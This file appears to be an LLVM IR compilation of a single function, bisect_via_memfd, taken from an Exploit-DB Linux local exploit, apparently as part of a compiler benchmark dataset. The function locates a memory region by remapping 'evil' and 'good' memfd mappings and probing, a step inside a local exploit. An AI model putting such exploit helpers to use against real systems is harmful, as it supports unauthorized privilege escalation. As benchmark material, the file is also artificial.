; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_bisect_via_memfd.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_bisect_via_memfd.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"evil\00", align 1
@evil = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"good\00", align 1
@good = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [13 x i8] c"[-] munmap()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i64 (i64, i64, i64)* @bisect_via_memfd to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i64 @bisect_via_memfd(i64 %0, i64 %1, i64 %2) #0 {
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i64 %0, i64* %4, align 8
  store i64 %1, i64* %5, align 8
  store i64 %2, i64* %6, align 8
  %14 = load i64, i64* %6, align 8
  %15 = load i64, i64* %5, align 8
  %16 = sub i64 %14, %15
  %17 = load i64, i64* %4, align 8
  %18 = urem i64 %16, %17
  %19 = icmp eq i64 %18, 0
  %20 = zext i1 %19 to i32
  %21 = call i32 @assert(i32 %20)
  %22 = load i64, i64* %4, align 8
  %23 = load i64, i64* @evil, align 8
  %24 = call i32 @create_filled_memfd(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i64 %22, i64 %23)
  store i32 %24, i32* %7, align 4
  %25 = load i64, i64* %4, align 8
  %26 = load i64, i64* @good, align 8
  %27 = call i32 @create_filled_memfd(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64 %25, i64 %26)
  store i32 %27, i32* %8, align 4
  store i64 0, i64* %9, align 8
  %28 = load i64, i64* %6, align 8
  %29 = load i64, i64* %5, align 8
  %30 = sub i64 %28, %29
  %31 = load i64, i64* %4, align 8
  %32 = udiv i64 %30, %31
  store i64 %32, i64* %10, align 8
  br label %33

33:                                               ; preds = %78, %3
  %34 = load i64, i64* %10, align 8
  %35 = load i64, i64* %9, align 8
  %36 = sub i64 %34, %35
  %37 = icmp ugt i64 %36, 1
  br i1 %37, label %38, label %79

38:                                               ; preds = %33
  %39 = load i64, i64* %9, align 8
  %40 = load i64, i64* %10, align 8
  %41 = load i64, i64* %9, align 8
  %42 = sub i64 %40, %41
  %43 = udiv i64 %42, 2
  %44 = add i64 %39, %43
  store i64 %44, i64* %11, align 8
  %45 = load i32, i32* %7, align 4
  %46 = load i64, i64* %4, align 8
  %47 = load i64, i64* %5, align 8
  %48 = load i64, i64* %9, align 8
  %49 = load i64, i64* %4, align 8
  %50 = mul i64 %48, %49
  %51 = add i64 %47, %50
  %52 = load i64, i64* %5, align 8
  %53 = load i64, i64* %11, align 8
  %54 = load i64, i64* %4, align 8
  %55 = mul i64 %53, %54
  %56 = add i64 %52, %55
  %57 = call i32 @remap_fd_over(i32 %45, i64 %46, i64 %51, i64 %56)
  %58 = load i32, i32* %8, align 4
  %59 = load i64, i64* %4, align 8
  %60 = load i64, i64* %5, align 8
  %61 = load i64, i64* %11, align 8
  %62 = load i64, i64* %4, align 8
  %63 = mul i64 %61, %62
  %64 = add i64 %60, %63
  %65 = load i64, i64* %5, align 8
  %66 = load i64, i64* %10, align 8
  %67 = load i64, i64* %4, align 8
  %68 = mul i64 %66, %67
  %69 = add i64 %65, %68
  %70 = call i32 @remap_fd_over(i32 %58, i64 %59, i64 %64, i64 %69)
  %71 = call i32 (...) @bisect_probe()
  store i32 %71, i32* %12, align 4
  %72 = load i32, i32* %12, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %76

74:                                               ; preds = %38
  %75 = load i64, i64* %11, align 8
  store i64 %75, i64* %9, align 8
  br label %78

76:                                               ; preds = %38
  %77 = load i64, i64* %11, align 8
  store i64 %77, i64* %10, align 8
  br label %78

78:                                               ; preds = %76, %74
  br label %33

79:                                               ; preds = %33
  %80 = load i64, i64* %5, align 8
  %81 = inttoptr i64 %80 to i8*
  %82 = load i64, i64* %6, align 8
  %83 = load i64, i64* %5, align 8
  %84 = sub i64 %82, %83
  %85 = call i32 @munmap(i8* %81, i64 %84)
  store i32 %85, i32* %13, align 4
  %86 = load i32, i32* %13, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %92

88:                                               ; preds = %79
  %89 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %90 = load i32, i32* @EXIT_FAILURE, align 4
  %91 = call i32 @exit(i32 %90) #3
  unreachable

92:                                               ; preds = %79
  %93 = load i32, i32* %7, align 4
  %94 = call i32 @close(i32 %93)
  %95 = load i32, i32* %8, align 4
  %96 = call i32 @close(i32 %95)
  %97 = load i64, i64* %5, align 8
  %98 = load i64, i64* %9, align 8
  %99 = load i64, i64* %4, align 8
  %100 = mul i64 %98, %99
  %101 = add i64 %97, %100
  ret i64 %101
}

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @create_filled_memfd(i8*, i64, i64) #1

declare dso_local i32 @remap_fd_over(i32, i64, i64, i64) #1

declare dso_local i32 @bisect_probe(...) #1

declare dso_local i32 @munmap(i8*, i64) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
